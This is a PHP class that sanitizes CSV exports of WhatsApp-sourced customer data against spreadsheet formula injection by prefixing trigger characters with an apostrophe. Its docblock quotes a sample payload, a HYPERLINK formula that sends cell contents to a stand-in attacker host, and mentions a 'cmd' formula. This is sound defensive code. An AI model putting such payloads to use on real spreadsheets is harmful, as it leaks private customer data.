<?php

namespace App\Support;

/**
 * Neutralizes spreadsheet formula injection in exported CSV files.
 *
 * The customer and sales exports write values that arrive from WhatsApp — the
 * customer's name, delivery address, phone, rider notes — straight into a CSV.
 * Excel, LibreOffice and Google Sheets treat a cell starting with `=`, `+`, `-`
 * or `@` as a formula, so a customer who gives their name as
 * `=HYPERLINK("https://evil.tld?d="&A1,"Click")` gets that formula executed in
 * the restaurant owner's spreadsheet, with the rest of the sheet readable to it.
 * The `\t` and `\r` variants exist because both are stripped by some readers
 * before the formula check, which lets a leading tab smuggle the `=` through.
 *
 * `fputcsv()` does not help here: quoting is about CSV structure, and a quoted
 * `"=cmd|..."` is still parsed as a formula once the quotes are consumed.
 *
 * The fix is a leading apostrophe, which spreadsheets read as "the rest of this
 * cell is literal text". It is visible in the raw file but not in the cell.
 */
class CsvSanitizer
{
    /**
     * Leading characters that make a spreadsheet evaluate the cell.
     */
    private const FORMULA_TRIGGERS = ['=', '+', '-', '@', "\t", "\r"];

    /**
     * Sanitize every field of a row.
     *
     * @param  array<int|string, mixed>  $fields
     * @return list<string>
     */
    public static function row(array $fields): array
    {
        return array_values(array_map([self::class, 'field'], $fields));
    }

    /**
     * Sanitize a single field.
     */
    public static function field(mixed $value): string
    {
        if ($value === null) {
            return '';
        }

        if (is_bool($value)) {
            return $value ? '1' : '0';
        }

        $string = (string) $value;

        if ($string === '') {
            return '';
        }

        // Plain numbers are never formulas, and the money/count columns have to
        // stay numeric for the owner to be able to sum them. This is what keeps
        // the `-` and `+` rules from mangling a legitimate `-250` refund line.
        if (is_numeric($string)) {
            return $string;
        }

        if (in_array($string[0], self::FORMULA_TRIGGERS, true)) {
            return "'" . $string;
        }

        return $string;
    }
}
